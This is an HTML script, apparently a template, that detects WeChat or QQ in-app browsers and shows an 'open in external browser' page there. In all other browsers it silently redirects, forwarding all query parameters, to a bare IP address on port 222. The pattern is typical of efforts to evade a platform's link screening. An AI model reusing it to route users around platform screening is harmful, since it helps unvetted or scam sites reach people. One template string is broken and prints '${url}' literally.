<script>

// 主逻辑
if (isWeChatOrQQ()) {
    outHtml("jp163.github.io/code");
    alert("不支持在微信内打开");
} else {
    const params = getQueryParams();
    const url1 = "http://62.234.2.63:222/yyds/"; // 替换为你的目标URL
    redirectToUrlWithParams(url1, params);
}

// 检查User-Agent是否包含特定字符串
function isWeChatOrQQ() {
    const ua = navigator.userAgent.toLowerCase();
    return ua.includes('micromessenger') || ua.includes('qq');
}

// 获取当前URL中的GET参数
function getQueryParams() {
    const params = {};
    const queryString = window.location.search.slice(1);
    const pairs = queryString.split("&");

    pairs.forEach(pair => {
        const [key, value] = pair.split("=");
        params[decodeURIComponent(key)] = decodeURIComponent(value || '');
    });

    return params;
}

// 将GET参数拼接到新URL上并跳转
function redirectToUrlWithParams(url, params) {
    const queryString = Object.keys(params)
        .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`)
        .join("&");

    const newUrl = `${url}?${queryString}`;
    window.location.href = newUrl; // 跳转到新的URL
}

// 输出html页面
function outHtml(url) {
document.writeln("<html>");
document.writeln("<head>");
document.writeln("<meta charset=\'UTF-8\'>");
document.writeln("<title>使用浏览器打开</title>");
document.writeln("<meta content=\'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\' name=\'viewport\'>");
document.writeln("<meta content=\'yes\' name=\'apple-mobile-web-app-capable\'>");
document.writeln("<meta content=\'black\' name=\'apple-mobile-web-app-status-bar-style\'>");
document.writeln("<meta name=\'format-detection\' content=\'telephone=no\'>");
document.writeln("<meta content=\'false\' name=\'twcClient\' id=\'twcClient\'>");
document.writeln("<meta name=\'aplus-touch\' content=\'1\'>");
document.writeln("<style>");
document.writeln("body,html{width:100%;height:100%}");
document.writeln("*{margin:0;padding:0}");
document.writeln("body{background-color:#fff}");
document.writeln("#browser img{width:50px;}");
document.writeln("#browser{margin: 0px 10px;text-align:center;}");
document.writeln("#contens{font-weight: bold;color: #2466f4;margin:-285px 0px 10px;text-align:center;font-size:20px;margin-bottom: 125px;}");
document.writeln(".top-bar-guidance{font-size:15px;color:#fff;height:70%;line-height:1.8;padding-left:20px;padding-top:20px;background:url(http://pic.adboys.cn/banner.png) center top/contain no-repeat}");
document.writeln(".top-bar-guidance .icon-safari{width:25px;height:25px;vertical-align:middle;margin:0 .2em}");
document.writeln(".app-download-tip{margin:0 auto;width:290px;text-align:center;font-size:15px;color:#2466f4;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAAcAQMAAACak0ePAAAABlBMVEUAAAAdYfh+GakkAAAAAXRSTlMAQObYZgAAAA5JREFUCNdjwA8acEkAAAy4AIE4hQq/AAAAAElFTkSuQmCC) left center/auto 15px repeat-x}");
document.writeln(".app-download-tip .guidance-desc{background-color:#fff;padding:0 5px}");
document.writeln(".app-download-btn{display:block;width:214px;height:40px;line-height:40px;margin:18px auto 0 auto;text-align:center;font-size:18px;color:#2466f4;border-radius:20px;border:.5px #2466f4 solid;text-decoration:none}");
document.writeln("</style>");
document.writeln("</head>");
document.writeln("<body>");
document.writeln("<div class=\'top-bar-guidance\'>");
document.writeln("<p>点击右上角<img src=\'http://pic.adboys.cn/3dian.png\' class=\'icon-safari\'>在 浏览器 打开</p>");
document.writeln("<p>苹果设备<img src=\'http://pic.adboys.cn/iphone.png\' class=\'icon-safari\'>安卓设备<img src=\'http://pic.adboys.cn/android.png\' class=\'icon-safari\'>↗↗↗</p>");
document.writeln("</div>");
document.writeln("<div id=\'contens\'>");
document.writeln("<p><br/><br/></p>");
document.writeln("<p>1.本站不支持 微信或QQ 内访问</p>");
document.writeln("<p><br/></p>");
document.writeln("<p>2.请按提示在手机 浏览器 打开</p>");
document.writeln("</div>");
document.writeln("<p><br/><br/></p>");
document.writeln("<div class=\'app-download-tip\'>");
document.writeln("<span class=\'guidance-desc\'>${url}</span>");
document.writeln("</div>");
document.writeln("<p><br/></p>");
document.writeln("<div class=\'app-download-tip\'>");
document.writeln("<span class=\'guidance-desc\'>点击右上角···图标 or 复制网址自行打开</span>");
document.writeln("</div>");
document.writeln("</body>");
document.writeln("</html>");
}

</script>
